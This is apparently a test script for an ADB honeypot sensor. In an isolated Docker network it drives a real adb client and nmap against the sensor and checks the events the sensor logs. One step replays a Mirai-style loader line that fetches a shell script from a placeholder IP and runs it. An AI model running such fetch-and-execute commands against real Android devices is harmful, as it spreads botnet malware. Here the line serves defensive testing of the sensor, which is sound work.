#!/bin/sh
# Black-box check with the real adb client and nmap against the built container.
# Usage (repo root):  sg docker -c "sh sensors/adb/tests/blackbox.sh"
# Everything runs on a throwaway network with no published ports and a throwaway Redis.
set -eu
cd "$(dirname "$0")/../../.."
NET=sp-adb-bb; NAME=sp-adb-bb; REDIS=sp-adb-bb-redis; IMG=sp-adb-bb:dev
cleanup() {
  docker rm -f "$NAME" "$REDIS" >/dev/null 2>&1 || true
  docker network rm "$NET" >/dev/null 2>&1 || true
  docker volume rm "$NAME-data" >/dev/null 2>&1 || true
  rm -f /tmp/sp-adb-client.sh
}
trap cleanup EXIT; cleanup
docker build -q -f sensors/adb/Dockerfile -t "$IMG" . >/dev/null
docker network create "$NET" >/dev/null
docker run -d --name "$REDIS" --network "$NET" --memory 64m valkey/valkey:9.1-alpine3.24 >/dev/null
docker run -d --name "$NAME" --network "$NET" --read-only --tmpfs /tmp --cap-drop ALL \
  --security-opt no-new-privileges:true --memory 256m --memory-swap 256m --cpus 0.5 --pids-limit 128 \
  -v "$NAME-data:/data" -e REDIS_HOST="$REDIS" -e EVENTS_STREAM=events:adb "$IMG" >/dev/null
for _ in $(seq 1 30); do
  [ "$(docker inspect -f '{{.State.Health.Status}}' "$NAME")" = healthy ] && break
  sleep 2
done
[ "$(docker inspect -f '{{.State.Health.Status}}' "$NAME")" = healthy ] || { echo "not healthy"; exit 1; }
echo HEALTHY
cat > /tmp/sp-adb-client.sh <<'INNER'
apk add -q android-tools >/dev/null 2>&1
export HOME=/tmp
adb start-server >/dev/null 2>&1
echo "--- adb connect"
adb connect sp-adb-bb:5555
adb devices -l
echo "--- adb shell getprop (shell_v2)"
adb -s sp-adb-bb:5555 shell getprop ro.product.model
adb -s sp-adb-bb:5555 shell 'getprop | head -5'
adb -s sp-adb-bb:5555 shell 'uname -a; id; ls -l /data/local/tmp'
echo "--- adb push"
head -c 300000 /dev/urandom > /tmp/payload.bin
sha256sum /tmp/payload.bin
adb -s sp-adb-bb:5555 push /tmp/payload.bin /data/local/tmp/payload.bin
adb -s sp-adb-bb:5555 shell 'cd /data/local/tmp && chmod 755 payload.bin && ./payload.bin; ls -l'
adb -s sp-adb-bb:5555 shell 'ls -l /data/local/tmp'
echo "--- adb pull"
adb -s sp-adb-bb:5555 pull /system/build.prop /tmp/build.prop && head -3 /tmp/build.prop
echo "--- Mirai-style loader"
adb -s sp-adb-bb:5555 shell 'cd /data/local/tmp && wget http://198.51.100.7/x.sh; busybox wget http://198.51.100.7/y.sh -O y.sh; chmod 777 y.sh; sh y.sh; rm -rf y.sh'
echo "--- adb install"
head -c 20000 /dev/urandom > /tmp/test.apk
adb -s sp-adb-bb:5555 install /tmp/test.apk
adb -s sp-adb-bb:5555 shell pm list packages | head -3
echo "--- interactive shell through a pty"
printf 'id\nexit\n' | adb -s sp-adb-bb:5555 shell
echo "--- interactive shell on a real pty (expect)"
apk add -q expect >/dev/null 2>&1
expect -c '
  set timeout 10
  spawn adb -s sp-adb-bb:5555 shell
  expect "# "; send "getprop ro.product.model\r"
  expect "# "; send "cd /data/local/tmp && ls\r"
  expect "# "; send "exit\r"
  expect eof' 2>&1 | tr -d '\r'
echo "--- adb reboot"
adb -s sp-adb-bb:5555 reboot
sleep 1
adb disconnect >/dev/null 2>&1
INNER
docker run --rm --network "$NET" -v /tmp/sp-adb-client.sh:/c.sh:ro alpine:3.24 sh /c.sh
echo "--- nmap -sV"
docker run --rm --network "$NET" instrumentisto/nmap -sV -p 5555 "$NAME" | grep -E "^5555|Service Info|adb|CNXN" || true
docker run --rm --network "$NET" instrumentisto/nmap -sV --version-all -p 5555 "$NAME" | grep -E "^5555|SF|Service" | head -5 || true
sleep 2
echo "--- stream events:adb"
docker exec "$REDIS" valkey-cli XLEN events:adb
docker exec "$REDIS" valkey-cli XRANGE events:adb - + COUNT 1000 | grep -o '"type":"[a-z_]*"' | sort | uniq -c
docker exec "$REDIS" valkey-cli XRANGE events:adb - + COUNT 1000 | grep -E "adb_push|adb_install|198\.51\.100" | cut -c1-200 | head -8
docker logs "$NAME" 2>&1 | head -5
docker logs "$NAME" 2>&1 | grep -ci "honeypot\|suckerpot" | sed "s/^/giveaway_lines_in_logs=/" || true
docker stats --no-stream --format 'mem={{.MemUsage}} cpu={{.CPUPerc}} pids={{.PIDs}}' "$NAME"
